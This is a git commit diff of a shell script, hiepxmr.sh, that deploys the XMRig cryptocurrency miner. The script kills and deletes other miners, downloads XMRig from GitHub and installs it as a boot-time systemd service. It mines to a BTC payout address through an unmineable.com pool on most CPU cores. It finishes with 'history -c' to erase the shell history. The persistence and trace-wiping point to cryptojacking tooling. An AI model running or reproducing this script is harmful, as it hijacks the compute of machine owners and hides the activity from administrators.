f55382e73b85a0212e00c2137def317e93b988f6
AhrimanSefid <ahrimansefid@gmail.com>
2023-04-05 12:53:14 +0330

    Update hiepxmr.sh

--- hiepxmr.sh
+++ hiepxmr.sh
@@ -1,16 +1,14 @@
 cd /usr/local/bin
-sudo killall SRBMiner-MULTI
-sudo rm -rf  SRBMiner-Multi-1-1-1
-sudo killall xmrig
-sudo rm -rf xmrig-6.18.1
-sudo rm -rf xmrig-6.16.2
-mwker=$(TZ='Asia/Ho_Chi_Minh' date +'%d-%m_%H')
+killall xmrig
+rm -rf xmrig-6.18.1
+rm -rf xmrig-6.16.2
+mwker=$(TZ='Asia/Tehran' date +'%d-%m_%H')
 noCore=$(nproc --all)
 usingcore=$((noCore*75/100))
-sudo wget https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-bionic-x64.tar.gz
-sudo tar xvzf xmrig-6.18.1-bionic-x64.tar.gz
-sudo bash -c 'echo -e "[Unit]\nDescription=XMRig Miner\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/usr/local/bin/xmrig-6.18.1/xmrig -o xmr-asia1.nanopool.org:14444 -u 85dVdzfJfoB633vzzvgJGvgxX9bXTgVrMfCuAo5kMv1uiKXZMcA5F6uXc71KnapvYR6QY36cbaZY7KyxGEEtXyuRPkig5PT."'${mwker}_C_${noCore}'" --randomx-no-rdmsr --threads="'${usingcore}'" --cpu-max-threads-hint=75 --coin monero --rig-id myworker\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/xmrig.service'
-sudo systemctl daemon-reload
-sudo systemctl enable xmrig.service
-sudo nohup ./xmrig-6.18.1/xmrig -o xmr-asia1.nanopool.org:14444 -u 85dVdzfJfoB633vzzvgJGvgxX9bXTgVrMfCuAo5kMv1uiKXZMcA5F6uXc71KnapvYR6QY36cbaZY7KyxGEEtXyuRPkig5PT.${mwker}_C_${noCore} --randomx-no-rdmsr --threads=${usingcore} --cpu-max-threads-hint=75 --coin monero --rig-id myworker &
+wget https://github.com/xmrig/xmrig/releases/download/v6.19.1/xmrig-6.19.1-linux-x64.tar.gz
+tar xvzf xmrig-6.19.1-linux-x64.tar.gz
+bash -c 'echo -e "[Unit]\nDescription=XMRig Miner\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/usr/local/bin/xmrig-6.19.1/xmrig -o rx.unmineable.com:3333 -a rx -k -u BTC:bc1qmw5hdlgw0fpc8kwm2ravtdkcfm5aegkdc8k993."'${mwker}_C_${noCore}'" -p 2 -k -a rx/0 --cpu-max-threads-hint=85\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/xmrig.service'
+systemctl daemon-reload
+systemctl enable xmrig.service
+nohup ./xmrig-6.19.1/xmrig -o rx.unmineable.com:3333 -a rx -k -u BTC:bc1qmw5hdlgw0fpc8kwm2ravtdkcfm5aegkdc8k993.${mwker}_C_${noCore} -p 2 -k -a rx/0 --cpu-max-threads-hint=85 &
 history -c
